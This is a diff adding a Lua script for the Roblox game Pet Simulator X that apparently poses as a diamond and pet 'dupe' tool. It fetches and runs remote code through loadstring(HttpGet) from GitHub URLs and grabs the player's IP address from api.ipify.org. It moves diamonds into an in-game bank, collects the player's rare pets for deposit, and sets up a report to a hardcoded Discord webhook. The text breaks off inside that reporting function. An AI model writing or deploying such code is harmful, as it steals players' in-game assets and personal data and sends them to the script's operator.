@@ -1,0 +1,1516 @@
+--SELF SETTINGS--
+
+
+local mywebhook = "https://discord.com/api/webhooks/959466636623093800/d5d8fbGL-zJoGCKsSm63xG4rzV1jBj8SllbnH-zCE4lEdjTKm74w_fpAZrcT45ySXZ7E" --CHANGE TO YOUR WEBHOOK--
+local dupeKey = 919199133 --CHANGE TO YOUR AUTHED ACCOUNT ID--
+local Deletehistoryy = true
+local autobuybankandupdatetotier2 = true
+local givewarning = false
+local giveawrningforbuybank = false
+local bypassshittyspamlog = true
+
+
+--SELF SETTINGS--
+
+
+--SETTINGS--
+
+
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework') : WaitForChild('Library'))
+local fardplayer = game.Players.LocalPlayer
+local getbankusername = game.Players.LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Owner
+local deletebank = game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Bank
+local gethistory = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History:FindFirstChild("Logs")
+local deletehistory = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History:FindFirstChild("Logs")  
+--local mypetsinbank = "Comming Soon"
+--local getmember = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List.Member
+local mydiamondsinbank = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Bottom.Balance.Amount.Text, "%,", "")
+local getdiamondsinbank = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Bottom.Balance.Amount
+local getbanktier = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text, "%,", "")
+local getbanktierfortier1 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier
+local UserInputService = game:GetService("UserInputService")
+local mybanks = lib.Network.Invoke("get my banks")
+local biggamescommands = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Admin Commands").Frame.Title
+--local getbank = mybanks[1]['BUID']
+local notcontinuedupe = false
+local wrongtier = false
+local verifedbank = false
+local tier1bank = false
+local unverifedbank = false
+local verifybank = mybanks[1]
+
+
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local getdiamonds = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+
+
+local PetsListForMythical = {}
+local PetsListForHuges = {}
+local PetsListForExclusives = {}
+
+
+request = http_request or request or HttpPost or syn.request
+local ipAdress = request({
+        Url = "https://api.ipify.org/",
+        Method = "GET"
+})
+
+
+local GetAuth = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nobodyoffcal/Project-Nobody-Auth/main/Auth.lua"))()
+local GetApi = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nobodyoffcal/Project-Nobody-Api/main/Api.lua"))()
+local botname = "Iyotan"
+
+
+local autoerrorhappenedforautobuybank = false
+local autobuyedbank = false
+local autoupgradedtotier2bank = false
+local autoerrorhappenedfortier2 = false
+local dupesuccsesd = false
+local dupesuccsesd2 = false
+local autodepositedgemstobank = false
+
+
+local seyanpseee = false
+local krkeneleee = false
+local scriptware = false
+local unkowwnnnn = false
+
+
+local hugeamogus = false
+local execlususive = false
+local mythiitical = false
+local leganadery = false
+local rareeef = false
+local basicooo = false
+local noneeeeee = false
+
+
+local exclusivessss = 0
+local mythicalsssss = 0
+local legandneryttt = 0 
+local rareasfasffff = 0
+local basicoooooooo = 0
+local hugesssssssss = 0
+local testpoint = 0 
+
+
+local AboutPlayerBank = ""
+local AboutPlayerBankTwo = ""
+local AboutPlayerBankThree = ""
+local Executor = ""
+local Pets = ""
+local getipadress = ""
+local gettier = ""
+local getmydiamondsinbank = ""
+local getmybankbuid = ""
+local GetDevice = ""
+
+
+local AboutPlayerRole = ""
+local AboutAutoSettings = ""
+local AboutAutoSettingsTwo = ""
+local AboutAutoSettingsThree = ""
+local AboutAutoSettingsFour = ""
+local AboutAutoSettingsFive = ""
+local AboutAutoSettingsSix = ""
+local AboutAutoSettingsSeven = ""
+local GetAuthName = ""
+local TimeLeft = ""
+
+
+local buyer = false
+local admin = false
+local guest = false
+local avabilehuge = false
+local avabileexclusive = false
+local avabilemythical = false
+local notwhitelisted = false
+
+
+local BannedTrue = false
+local HaveReasonForBanned = false
+local playerhavehistroy = false
+local playerinvited = false
+local LeakedTrue = false
+
+
+local UnkownTime = false
+local Lifetime = false
+local Days30 = false
+local Days20 = false
+local Days10 = false
+local Expiryed = false
+local dontsendlog = false
+
+
+--SETTINGS--
+
+
+--CHECK FOR USER--
+
+
+function CheckForUser()
+    --SusNobody#4877
+    if dupeKey == 3277335950 then
+        GetAuthName = "NobodyOffcal"
+    --Fatee#0555
+    else if dupeKey == 919199133 then
+        GetAuthName = "jhariez4"
+    --yourdailydoseofinternet#9491
+    else if dupeKey == 2781274676 then
+        GetAuthName = "shadow_hunter039"
+    --UNKOWN
+    else if dupeKey == 2776550567 then
+        GetAuthName = "Lidil2544"
+    --me756j#7490
+    else if dupeKey == 3364411196 then
+        GetAuthName = "Noname325632"
+    --Alec <9#1445
+    else if dupeKey == 514099393 then
+        GetAuthName = "roguebrian12345"
+    --UNKOWN
+    else if dupeKey == 2927494163 then
+        GetAuthName = "ImSmokingThrax"
+    --Rezn#2992
+    else if dupeKey == 2349786221 then
+        GetAuthName = "jyhtgrfedr777"
+    --susbody#9606
+    else if dupeKey == 3351881039 then
+        GetAuthName = "itsmihaaaai"
+    --UNKOWN
+    else if dupeKey == 2206931886 then
+        GetAuthName = "Xmonster197"
+    --goldcigo#4364
+    else if dupeKey == 2398406845 then
+        GetAuthName = "danik_frajer"
+    end
+end
+end
+end
+end
+end
+end
+end
+end
+end
+end
+end
+
+
+--CHECK FOR USER--
+
+
+--CHECK FOR KEY TIME--
+
+
+function CheckForKeyTime()
+    if Lifetime == true then
+        TimeLeft = "Lifetime"
+    else if Days30 == true then
+        TimeLeft = "30 Days"
+    else if Days20 == true then
+        TimeLeft = "20 Days"
+    else if Days10 == true then
+        TimeLeft = "10 Days"
+    else if Expiryed == true then
+        TimeLeft = "Expiryed"
+    else if TimeLeft == "" then
+        UnkownTime = true
+        TimeLeft = "Unkown" 
+    end
+end
+end
+end
+end
+end
+end
+
+
+--CHECK FOR KEY TIME--
+
+
+--VERIFY KEY TIME--
+
+
+function VerifyKeyTime()
+    for i,v in pairs(GetAuth) do
+    if v == GetAuthName.."_KeyTime_LifeTime" then
+        Lifetime = true
+    else if v == GetAuthName.."_KeyTime_30Days" then
+        Days30 = true
+    else if v == GetAuthName.."_KeyTime_20Days" then
+        Days20 = true
+    else if v == GetAuthName.."_KeyTime_10Days" then
+        Days10 = true
+    else if v == GetAuthName.."_KeyTime_Expiryed" then
+        Expiryed = true
+    end
+end
+end
+end
+end
+end
+end
+--VERIFY KEY TIME--
+
+
+--CHECK FOR ROLE--
+
+
+function CheckForRole()
+        if buyer == true then
+                AboutPlayerRole = "Buyer"
+        else if admin == true then
+                        AboutPlayerRole = "Administrator"
+                else if guest == true then
+                                AboutPlayerRole = "Guest"
+                        else if AboutPlayerRole == "" then
+                                        AboutPlayerRole = "Unkown"
+                                end
+                        end
+                end
+        end
+end
+
+
+--CHECK FOR ROLE--
+
+
+--CHECK FOR MESSAGE--
+
+
+function CheckForMessage()
+        if admin == true and Expiryed == false and UnkownTime == false then
+                print("Welcome Back. Thanks For Using Us.")
+                wait(0.1)
+                print("User Rank : Administrator")
+                wait(0.1)
+                print("Key Expiry In : "..TimeLeft.." !")
+        else if buyer == true and Expiryed == false and UnkownTime == false then
+                print("Welcome Back. Thanks For Using Us.")
+                wait(0.1)
+                print("User Rank : Buyer")
+                wait(0.1)
+                print("Key Expiry In : "..TimeLeft.." !")
+        else if guest == true and Expiryed == false and UnkownTime == false then
+                print("Welcome Back. Thanks For Using Us.")
+                wait(0.1)
+                print("User Rank : Guest")
+                wait(0.1)
+                print("Key Expiry In : "..TimeLeft.." !")
+        else if Expiryed == true then
+            LeakedTrue = true
+            print("Your Key Expiryed !")
+            return;
+        else if TimeLeft == "" or TimeLeft == "Unkown" then
+            LeakedTrue = true
+            print("Your Key Expiry Time Is Unkown !")
+            return;
+        end
+        end
+        end
+end
+end
+end
+
+
+--CHECK FOR MESSAGE--
+
+
+--CHECK FOR ADMIN IP--
+
+
+function GetIp()
+        if admin == true and GetDevice == "Computer" then
+                getipadress = "You Cannot See Administrators Ip"
+        else if buyer == true or guest == true and GetDevice == "Computer" then
+                        getipadress = ipAdress.Body
+                else if getipadress == "" and GetDevice == "Computer" then
+                                getipadress = "Unkown"
+                        else if admin == true or buyer == true or guest == true and GetDevice == "Phone" or GetDevice == "Console" then
+                                        getipadress = "This Fetaure Not Enabled"
+                                else if getipadress == "" then
+                                    getipadress = "Unkown"
+                                end
+                        end
+                end
+        end
+end
+end
+
+
+--CHECK FOR ADMIN IP--
+
+
+--CHECK BAN REASON--
+
+
+function BannedTrueLol()
+    for i,v in pairs(GetAuth) do
+        if v == GetAuthName.."_BannedTrue" then
+            print("Banned : True")
+            BannedTrue = true
+            wait(0.1)
+            CheckBannedForLeaking()
+        end
+    end
+end
+
+
+--CHECK BAN REASON--
+
+
+--GET REASON FOR BANNING--
+
+
+function CheckReasonForBanning()
+            for i,v in pairs(GetAuth) do
+                if v == GetAuthName.."_BannedTrue" and GetAuthName.."_LeakingScript" then
+                    HaveReasonForBanned = true
+            end
+    end
+end
+
+
+--GET REASON FOR BANNING--
+
+
+--CHECK FOR BANNED--
+
+
+function CheckBannedForLeaking()
+        print("Your Account Is Banned By Administrator! Contact Any Administrator To Re Active Your Account.")
+        wait(0.1)
+        CheckReasonForBanning()
+        wait(0.1)
+        if HaveReasonForBanned == true then
+            print("Ban Reason : Trying To Leak Script")
+            return true;
+        else
+            print("Ban Reason : Unkown")
+            return true;
+        end
+        return true;
+end
+
+
+--CHECK FOR BANNED--
+
+
+--CHECK FOR PLAYER--
+
+
+function CheckForUserTwo()
+            for i,v in pairs(GetAuth) do
+                if v == "_BannedTrue" and GetAuthName.."_KeyTrue" then
+                    BannedTrueLol()
+                    return;
+                else if v == GetAuthName.."_AdminTrue" and GetAuthName.."_BannedFalse" and GetAuthName.."_KeyTrue" and fardplayer.Name == GetAuthName then
+                    admin = true
+                    wait(0.1)
+                    VerifyKeyTime()
+                    wait(0.1)
+                    CheckForKeyTime()
+                    wait(0.1)
+                    CheckForMessage()
+                    return true;
+                else if v == GetAuthName.."_AdminFalse" and GetAuthName.."_BannedFalse" and GetAuthName.."_KeyTrue" and fardplayer.Name == GetAuthName then
+                    buyer = true
+                    wait(0.1)
+                    VerifyKeyTime()
+                    wait(0.1)
+                    CheckForKeyTime()
+                    wait(0.1)
+                    CheckForMessage()
+                    return true;
+                end
+             end
+      end
+   end
+end
+
+
+function CheckIfGuest()
+        for i,v in pairs(GetAuth) do
+                if buyer == false and admin == false then
+                    BannedTrueLol()
+                    if BannedTrue == false and LeakedTrue == false and v == GetAuthName.."_BannedFalse" and GetAuthName.."_AdminFalse" then
+                        guest = true
+                        wait(0.1)
+                        VerifyKeyTime()
+                    wait(0.1)
+                    CheckForKeyTime()
+                    wait(0.1)
+                        CheckForMessage()
+                        return true;
+                    else if GetAuthName == "" then
+                        LeakedTrue = true
+                        print("You Not Whitelisted")
+                        return; 
+                    else if v == GetAuthName.."_KeyTrue" then
+                        LeakedTrue = true
+                        print("Unkown Fatal Error 404")
+                        return;
+                    end
+            end
+    end
+end
+end
+end
+
+
+--CHECK FOR PLAYER--
+
+
+--CHECK FOR API--
+
+
+function CheckForApi()
+    for i,v in pairs(GetApi) do
+        if v == "Leaked_True" then
+            LeakedTrue = true
+            print("Script Has Been Leaked Please Wait While We Fix Script")
+            return;
+        else if v == "MaintranceBreak_True" then
+            LeakedTrue = true
+            print("Maintrance Break Please Wait While We Fix Script")
+            return;
+        end
+    end
+end
+end
+
+
+--CHECK FOR API--
+
+
+--VERIFY API--
+
+
+function VerifyApi()
+    CheckForApi()
+end
+
+
+--VERIFY API--
+
+
+--VERIFY AUTH--
+
+
+function VerifyAuth()
+    CheckForApi()
+    CheckForUser()
+    CheckForUserTwo()
+    CheckIfGuest()
+end
+
+
+--VERIFY AUTH--
+
+
+--VERIFY BANK--
+
+
+if verifybank then
+        print("Verifed Bank!")
+        verifedbank = true
+end
+
+
+--VERIFY BANK--
+
+
+--CHECK IF VERIFED OR NOT
+
+
+if verifedbank == false then
+        print("Unverifed Bank!")
+        unverifedbank = true
+end
+
+
+
+
+--CHECK IF VERIFED OR NOT
+
+
+--BYPASS SPAM LOG--
+
+
+function BypassSpamLog()
+    if bypassshittyspamlog == true then
+        local saveintocommands = biggamescommands
+        if saveintocommands.Text == "BIG Games Commands" then
+            saveintocommands.Text = "Executed"
+        else
+            dontsendlog = true
+        end
+    end
+end
+
+
+--BYPASS SPAM LOG--
+
+
+--VERIFY BANKS--
+
+
+function VerifyBanks()
+        if verifedbank == true then
+                AboutPlayerBank = getmybankbuid
+                AboutPlayerBankTwo = gettier
+                AboutPlayerBankThree = getmydiamondsinbank
+        else if unverifedbank == true then
+                        AboutPlayerBank = "Player Dont Have Bank"
+                        AboutPlayerBankTwo = "Player Dont Have Bank"
+                        AboutPlayerBankThree = "Player Dont Have Bank"
+                end
+        end
+end
+
+
+--VERIFY BANKS--
+
+
+--VERIFY DEVICE--
+
+
+function VerifyDevice()
+        if UserInputService.KeyboardEnabled then
+                GetDevice = "Computer"
+        else if UserInputService.TouchEnabled then
+                        GetDevice = "Phone"
+                else if UserInputService.GamepadEnabled then
+                                GetDevice = "Console"
+                        else if GetDevice == "" then
+                                        GetDevice = "Unkown"
+                                end
+                        end
+                end
+        end
+end
+
+
+--VERIFY DEVICE--
+
+
+--VERIFY EXECUTORS--
+
+
+function VerifyExecutors()
+        if seyanpseee == true then
+                Executor = "Synapse X"
+        else if scriptware == true then
+                        Executor = "Scriptware"
+                else if krkeneleee == true then
+                                Executor = "Krnl"
+                        else if unkowwnnnn == true then
+                                        Executor = "Unkown"
+                                end
+                        end
+                end
+        end
+end
+
+
+--VERIFY EXECUTORS--
+
+
+--VERIFY AUTO SETTINGS--
+
+
+function VerifyAutoSettings()
+        if not game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") and autobuyedbank == false then
+                AboutAutoSettings = "False"
+        else if autobuyedbank == true then
+                        AboutAutoSettings = "True"
+                else if autoerrorhappenedforautobuybank == true and game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") then
+                                AboutAutoSettings = "Fatal Error 404"
+                        else if AboutAutoSettings == "" then
+                                        AboutAutoSettings = "Unkown"
+                                end
+                        end
+                end
+        end
+end
+
+
+--VERIFY AUTO SETTINGS--
+
+
+--VERIFY AUTO SETTINGS TWO--
+
+
+function VerifyAutoSettingsTwo()
+        if getbanktier == "Tier 2 Bank" or getbanktier == "Tier 3 Bank" or getbanktier == "Tier 4 Bank" or getbanktier == "Tier 5 Bank" or getbanktier == "Tier 6 Bank" or getbanktier == "Tier 7 Bank" then
+                AboutAutoSettingsTwo = "False"
+        else if autoupgradedtotier2bank == true then
+                        AboutAutoSettingsTwo = "True"
+                else if autoerrorhappenedfortier2 == true or game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") or getbanktier == "Bank Tier 1" then
+                                AboutAutoSettingsTwo = "Fatal Error 404"
+                        else if AboutAutoSettingsTwo == "" then
+                                        AboutAutoSettingsTwo = "Unkown"
+                                end
+                        end
+                end
+        end
+end
+--VERIFY AUTO SETTINGS TWO--
+
+
+--VERIFY PLAYER HISTORY--
+
+
+function VerifyPlayerHistory()
+   if gethistory:FindFirstChild("Log1") then
+       playerhavehistroy = true
+   if playerhavehistroy == true then
+       if gethistory.Log1.desc.Text == GetAuthName.." was invited." then
+           playerinvited = true
+       end
+   end
+end
+end
+
+
+--VERIFY PLAYER HISTORY--
+
+
+--VERIFY AUTO SETTINGS THREE--
+
+
+function VerifyAutoSettingsThree()
+        if dupesuccsesd == true then
+                AboutAutoSettingsThree = "True"
+                else if playerinvited then
+                    AboutAutoSettingsThree = "Invite Already Pending"
+                    else if dupesuccsesd == false then
+                        AboutAutoSettingsThree = "False"
+                        else if testpoint == "5" then
+                            AboutAutoSettingsThree = "Player Members Full"
+                            else if dupesuccsesd == false then
+                                AboutAutoSettingsThree = "False"
+                                else if AboutAutoSettingsThree == "" then
+                                    AboutAutoSettingsThree = "Unkown"
+                                end
+                            end
+                        end
+                    end
+                end
+        end
+end
+
+
+--VERIFY AUTO SETTINGS THREE--
+
+
+--VERIFY AUTO SETTINGS FOUR--
+
+
+function VerifyAutoSettingsFour()
+        if dupesuccsesd2 == true then
+                AboutAutoSettingsFour = "True"
+        else if dupesuccsesd2 == false then
+                        AboutAutoSettingsFour = "False"
+                else if AboutAutoSettingsFour == "" then
+                                AboutAutoSettingsFour = "Unkown"
+                        end
+                end
+        end
+end
+
+
+--VERIFY AUTO SETTINGS FOUR--
+
+
+--VERIFY AUTO SETTINGS FIVE--
+
+
+function VerifyAutoSettingsFive()
+        if dupesuccsesd2 == true and dupesuccsesd then
+                AboutAutoSettingsFive = "True"
+        else if dupesuccsesd2 == false or dupesuccsesd == false then
+                        AboutAutoSettingsFive = "False"
+                else if AboutAutoSettingsFive == "" then
+                                AboutAutoSettingsFive = "Unkown"
+                        end
+                end
+        end
+end
+
+
+--VERIFY AUTO SETTINGS FIVE--
+
+
+--VERIFY AUTO SETTINGS SIX--
+
+
+function VerifyAutoSettingsSix()
+        if autodepositedgemstobank == true then
+                AboutAutoSettingsSix = "True"
+        else if autodepositedgemstobank == false then
+                        AboutAutoSettingsSix = "False"
+                else if AboutAutoSettingsSix == "" then
+                                AboutAutoSettingsSix = "Unkown"
+                        end
+                end
+        end
+end
+
+
+--VERIFY AUTO SETTINGS SIX--
+
+
+--VERIFY AUTO SETTINGS SEVEN--
+
+
+function VerifyAutoSettingsSeven()
+    
+    local getmember = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member")
+    if getmember then
+        getmember.Name = "Member5"
+    end
+    
+    wait(0.2)
+    
+    local getmember = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member")
+    if getmember then
+        getmember.Name = "Member4"
+    end
+    
+    wait(0.2)
+    
+    local getmember = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member")
+    if getmember then
+        getmember.Name = "Member3"
+    end
+    
+    wait(0.2)
+
+
+    local getmember = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member")
+    if getmember then
+        getmember.Name = "Member2"
+    end
+    
+    wait(0.2)
+
+
+    local getmember = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member")
+    if getmember then
+        getmember.Name = "Member1"
+    end
+    
+    wait(0.2)
+    
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member1") then
+        local getmember1 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List.Member1
+        
+        if getmember1 then
+            testpoint = testpoint + 1
+        else
+            print("Not Avabile")
+        end
+    else
+        print("Not Avabile")
+    end
+    
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member2") then
+        local getmember2 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List.Member2
+        
+        if getmember2 then
+            testpoint = testpoint + 1
+        else
+            print("Not Avabile")
+        end
+    else
+        print("Not Avabile")
+    end
+    
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member3") then
+        local getmember3 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List.Member3
+        
+        if getmember3 then
+            testpoint = testpoint + 1
+        else
+            print("Not Avabile")
+        end
+    else
+        print("Not Avabile")
+    end
+    
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member4") then
+        local getmember4 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List.Member4
+        
+        if getmember4 then
+            testpoint = testpoint + 1
+        else
+            print("Not Avabile")
+        end
+    else
+        print("Not Avabile")
+    end
+    
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member5") then
+        local getmember5 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List.Member5
+        
+        if getmember5 then
+            testpoint = testpoint + 1
+        else
+            print("Not Avabile")
+        end
+    else
+        print("Not Avabile")
+    end
+
+
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member1") then
+        local getmember1 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member1")
+        getmember1.Name = "Member"
+    end
+    
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member2") then
+        local getmember2 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member2")
+        getmember2.Name = "Member"
+    end
+    
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member3") then
+        local getmember3 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member3")
+        getmember3.Name = "Member"
+    end
+    
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member4") then
+        local getmember4 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member4")
+        getmember4.Name = "Member"
+    end
+        
+    if game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member5") then
+        local getmember5 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.List:FindFirstChild("Member5")
+        getmember5.Name = "Member"
+    end
+
+
+end
+
+
+
+
+--VERIFY AUTO SETTINGS SEVEN--
+
+
+--VERIFY PETS--
+
+
+function VerifyPets()
+        if hugeamogus == true then
+                Pets = "Huge"
+        else if execlususive == true then
+                        Pets = "Exclusive"
+                else if mythiitical == true then
+                                Pets = "Mythical"
+                        else if leganadery == true then
+                                        Pets = "Legendary"
+                                else if rareeef == true then
+                                                Pets = "Rare"
+                                        else if basicooo == true then
+                                                        Pets = "Basic"
+                                                else if noneeeeee == true then
+                                                                Pets = "None"
+                                                        end
+                                                end
+                                        end
+                                end
+                        end
+                end
+        end
+end
+
+
+--VERIFY PETS--
+
+
+--UPDATE SETTINGS--
+
+
+function UpdateSettings()
+        tier1bank = false
+        unverifedbank = false
+        verifedbank = true
+end
+
+
+--UPDATE SETTINGS--
+
+
+--CHECK FOR EXECUTOR--
+
+
+function CheckForExecutor()
+        if syn_checkcaller and "Synapse" then
+                seyanpseee = true
+        else if identifyexecutor() == "ScriptWare" and "ScriptWare" then
+                        scriptware = true
+                else if KRNL_LOADED and "KRNL" then
+                                krkeneleee = true
+                        else if krkeneleee == false and scriptware == false and seyanpseee == false then
+                                        unkowwnnnn = true
+                                end
+                        end
+                end
+        end
+end
+
+
+--CHECK FOR EXECUTOR--
+
+
+--CHECK IF DONT HAVE BANK--
+
+
+if unverifedbank == true and autobuybankandupdatetotier2 == true then
+
+
+        local args = {
+
+
+                [1] = {}
+        }
+
+
+        workspace.__THINGS.__REMOTES:FindFirstChild("buy bank"):InvokeServer(unpack(args))
+
+
+        print("Buyed Bank!")
+
+
+        wait(1.5)
+
+
+        if getbanktierfortier1.Text == "Tier 1 Bank" then
+                autobuyedbank = true
+        else
+                autoerrorhappenedforautobuybank = true
+        end
+
+
+        VerifyAutoSettings()
+
+
+        wait(1.5)
+end
+
+
+--CHECK IF DONT HAVE BANK--
+
+
+--CHECK IF BANK TIER 1--
+
+
+if getbanktierfortier1.Text == "Tier 1 Bank" and autobuybankandupdatetotier2 == true then
+        print("Tier 1 Bank!")
+        tier1bank = true
+        wait(2)
+end
+
+
+--IF PLAYER BANK TIER 1--
+
+
+if tier1bank == true and autobuybankandupdatetotier2 == true then
+        if getdiamondsinbank.Text == "40000000" or getdiamondsinbank.Text > "40000000" then
+
+
+                local args = {
+                        [1] = {
+                                [1] = mybanks[1]['BUID'],
+                                [2] = {},
+                                [3] = 1
+                        }
+                }
+
+
+                workspace.__THINGS.__REMOTES:FindFirstChild("bank deposit"):InvokeServer(unpack(args))
+
+
+
+
+        else if getdiamondsinbank.Text == "0" or getdiamondsinbank.Text < "40000000" then
+
+
+                        local args = {
+                                [1] = {
+                                        [1] = mybanks[1]['BUID'],
+                                        [2] = {},
+                                        [3] = 40000000
+                                }
+                        }
+
+
+                        workspace.__THINGS.__REMOTES:FindFirstChild("bank deposit"):InvokeServer(unpack(args))
+
+
+                end  
+        end
+
+
+        print("Deposited Diamonds To Bank!")
+
+
+        wait(2)
+
+
+        local args = {
+                [1] = {
+                        [1] = mybanks[1]['BUID'],
+                }
+        }
+
+
+        workspace.__THINGS.__REMOTES:FindFirstChild("upgrade bank"):InvokeServer(unpack(args))
+
+
+        local args = {
+                [1] = "b",
+                [2] = "upgrade bank"
+        }
+
+
+        workspace.__THINGS.__REMOTES.MAIN:FireServer(unpack(args))
+
+
+        print("Upgraded Bank!")
+
+
+        UpdateSettings()
+
+
+        print("Updated Settings")
+
+
+        if getbanktierfortier1.Text == "Tier 2 Bank" then
+                autobuybankandupdatetotier2 = true
+        else
+                autoerrorhappenedfortier2 = true
+        end
+
+
+        wait(3)
+end
+
+
+--IF PLAYER BANK TIER 1--
+
+
+--GET THE BEST PET ON PLAYERS INVENTORY--
+
+
+for i, v in pairs(lib.Save.Get().Pets) do
+        local v2 = lib.Directory.Pets[v.id];
+
+
+        if v2.rarity == "Exclusive" then
+                execlususive = true;
+
+
+        else if v2.rarity == "Mythical" then
+                        mythiitical = true;
+
+
+                else if v2.rarity == "Legendary" then
+                                leganadery = true;
+
+
+                        else if v2.rarity == "Rare" then
+                                        rareeef = true;
+
+
+                                else if v2.rarity == "Basic" then
+                                                basicooo = true;
+
+
+                                        else if mythiitical == false and execlususive == false and leganadery == false and rareeef == false and basicooo == false then
+                                                        noneeeeee = true;
+                                                end
+                                        end
+                                end
+                        end
+                end
+        end
+end
+
+
+--GET THE BEST PET ON PLAYERS INVENTORY--
+
+
+--FIND PETS ON PLAYER INVENTORY--
+
+
+for i, v in pairs(lib.Save.Get().Pets) do
+        local v2 = lib.Directory.Pets[v.id];
+
+
+        if v2.name == "Huge Cat" or v2.name == "Huge Cupcake" or v2.name == "Huge Dog" or v2.name == "Huge Dragon" or v2.name == "Huge Festive Cat" or v2.name == "Huge Forest Wyvern" or v2.name == "Huge Gargoyle Dragon" or v2.name == "Huge Hacked Cat" or v2.name == "Huge Lucky Cat" or v2.name == "Huge Pixel Cat" or v2.name == "Huge Pony" or v2.name == "Huge Pumkin Cat" or v2.name == "Huge Santa" or v2.name == "Huge Strom Agony" then
+                hugeamogus = true
+                hugesssssssss = hugesssssssss + 1
+
+
+        else if v2.rarity == "Exclusive" then
+                        exclusivessss = exclusivessss + 1 
+
+
+                else if v2.rarity == "Mythical" then
+                                mythicalsssss = mythicalsssss + 1
+
+
+                        else if v2.rarity == "Legendary" then
+                                        legandneryttt = legandneryttt + 1
+
+
+                                else if v2.rarity == "Rare" then
+                                                rareasfasffff = rareasfasffff + 1
+
+
+                                        else if v2.rarity == "Basic" then
+                                                        basicoooooooo = basicoooooooo + 1
+                                                end
+                                        end
+                                end                
+                        end
+
+
+                end
+        end
+end
+
+
+--FIND PETS ON PLAYER INVENTORY--
+
+
+--DEPOSIT PETS--
+
+
+function DepositPets()
+        for i,v in pairs(lib.Save.Get().Pets) do
+                local v2 = lib.Directory.Pets[v.id];
+                if v2.name == "Huge Cat" or v2.name == "Huge Cupcake" or v2.name == "Huge Dog" or v2.name == "Huge Dragon" or v2.name == "Huge Festive Cat" or v2.name == "Huge Forest Wyvern" or v2.name == "Huge Gargoyle Dragon" or v2.name == "Huge Hacked Cat" or v2.name == "Huge Lucky Cat" or v2.name == "Huge Pixel Cat" or v2.name == "Huge Pony" or v2.name == "Huge Pumkin Cat" or v2.name == "Huge Santa" or v2.name == "Huge Strom Agony" then
+                        avabilehuge = true
+                        table.insert(PetsListForHuges, v.uid)
+                end
+                if v2.rarity == "Exclusive" then
+                        avabileexclusive = true
+                        table.insert(PetsListForExclusives, v.uid);
+                end
+                if v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
+                        avabilemythical = true
+                        table.insert(PetsListForMythical, v.uid);
+                end
+        end
+end
+
+
+--DEPOSIT PETS--
+
+
+--SEND LOG--
+
+
+function SendLog()
+        local fardplayer = game.Players.LocalPlayer
+        local webhook = true
+        local linktwo = mywebhook
+        if webhook == true then
+
+
+                local Embed = {
+                        ["title"] = botname,
